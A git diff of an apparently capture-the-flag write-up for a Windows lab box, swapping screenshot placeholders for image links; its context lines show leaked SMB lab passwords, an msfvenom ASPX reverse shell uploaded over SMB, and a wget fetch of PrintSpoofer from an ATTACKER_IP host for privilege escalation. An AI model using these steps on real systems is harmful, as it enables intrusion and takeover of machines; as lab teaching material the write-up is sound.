@@ -114,8 +114,8 @@ Bob - !P@$$W0rD!123
 Bill - Juw4nnaM4n420696969!$$$
 ```
 
-[SCREEN01]
-[SCREEN02]
+<img width="633" height="522" alt="SCREEN01" src="https://github.com/user-attachments/assets/39a52391-8648-406f-88ed-76285f95785e" />
+<img width="545" height="520" alt="SCREEN02" src="https://github.com/user-attachments/assets/4241943a-6866-49ef-a8d6-38776a20cb77" />
 
 5. Test the discovered credentials to determine access levels using `smbmap`. Both users provide the same access permissions.
 
@@ -164,7 +164,7 @@ Navigate to `http://<TARGET_IP>:49663/nt4wrksv/test.txt` in a browser. The file 
 - The SMB share is mapped to the IIS web server
 - We can upload files that are executable via HTTP
 
-[SCREEN03]
+<img width="566" height="121" alt="SCREEN03" src="https://github.com/user-attachments/assets/25f13ba1-fa20-4525-871f-4cc116030457" />
 
 8. Create an ASPX reverse shell payload using `msfvenom`. ASPX is used because IIS natively supports ASP.NET.
 
@@ -193,7 +193,7 @@ put exploit.aspx
 more c:\Users\Bob\Desktop\user.txt
 ```
 
-[SCREEN04]
+<img width="376" height="59" alt="SCREEN04" src="https://github.com/user-attachments/assets/f8346a8a-ee5f-41d2-b3ef-b65bdfca7d5f" />
 
 ---
 
@@ -242,7 +242,7 @@ wget http://<ATTACKER_IP>:8000/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe
 whoami
 ```
 
-[SCREEN05]
+<img width="544" height="175" alt="SCREEN05" src="https://github.com/user-attachments/assets/7b7b8a63-7c9a-482b-a0f9-040bc75148b1" />
 
 5. Navigate to the Administrator's desktop and read the root flag:
 
@@ -251,4 +251,4 @@ dir c:\Users\Administrator\Desktop
 more C:\Users\Administrator\Desktop\root.txt
 ```
 
-[SCREEN06]
+<img width="555" height="243" alt="SCREEN06" src="https://github.com/user-attachments/assets/ac53dfd9-ce06-4ffd-a8b4-d320c1b91ed4" />
